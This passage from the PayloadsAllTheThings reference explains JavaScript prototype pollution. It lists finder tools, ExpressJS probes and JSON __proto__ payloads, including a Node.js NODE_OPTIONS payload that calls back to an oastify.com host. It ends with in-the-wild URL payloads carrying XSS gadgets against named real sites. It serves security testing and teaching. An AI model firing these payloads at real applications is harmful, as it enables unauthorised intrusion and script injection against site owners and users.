<!-- source: Prototype Pollution/README.md | chunk 1/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

# Prototype Pollution

> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Examples](#examples)
    * [Manual Testing](#manual-testing)
    * [Prototype Pollution via JSON Input](#prototype-pollution-via-json-input)
    * [Prototype Pollution in URL](#prototype-pollution-in-url)
    * [Prototype Pollution Payloads](#prototype-pollution-payloads)
    * [Prototype Pollution Gadgets](#prototype-pollution-gadgets)
* [Labs](#labs)
* [References](#references)

## Tools

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation
* [yuske/silent-spring](https://github.com/yuske/silent-spring) - Prototype Pollution Leads to Remote Code Execution in Node.js
* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Server-Side Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages
* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) - Prototype Pollution and useful Script Gadgets
* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - Burp Suite Extension detectiong Prototype Pollution vulnerabilities
* [msrkp/PPScan](https://github.com/msrkp/PPScan) - Client Side Prototype Pollution Scanner

## Methodology

In JavaScript, prototypes are what allow objects to inherit features from other objects. If an attacker is able to add or modify properties of `Object.prototype`, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.

```js
var myDog = new Dog();
```

```js
// Points to the function "Dog"
myDog.constructor;
```

```js
// Points to the class definition of "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Examples

* Imagine that an application uses an object to maintain configuration settings, like this:

    ```js
    let config = {
        isAdmin: false
    };
    ```

* An attacker might be able to add an `isAdmin` property to `Object.prototype`, like this:

    ```js
    Object.prototype.isAdmin = true;
    ```

### Manual Testing

* ExpressJS: `{ "__proto__":{"parameterLimit":1}}` + 2 parameters in GET request, at least 1 must be reflected in the response.
* ExpressJS: `{ "__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
* ExpressJS: `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
* Change the padding of a JSON response: `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, the server should return `{"foo": "bar"}`
* Modify CORS header responses: `{ "__proto__":{"exposedHeaders":["foo"]}}`, the server should return the header `Access-Control-Expose-Headers`.
* Change the status code: `{ "__proto__":{"status":510}}`

### Prototype Pollution via JSON Input

You can access the prototype of any object via the magic property `__proto__`.
The `JSON.parse()` function in JavaScript is used to parse a JSON string and convert it into a JavaScript object. Typically it is a sink function where prototype pollution can happen.

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

Asynchronous payload for NodeJS.

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

Polluting the prototype via the `constructor` property instead.

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### Prototype Pollution in URL

Example of Prototype Pollution payloads found in the wild.

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```
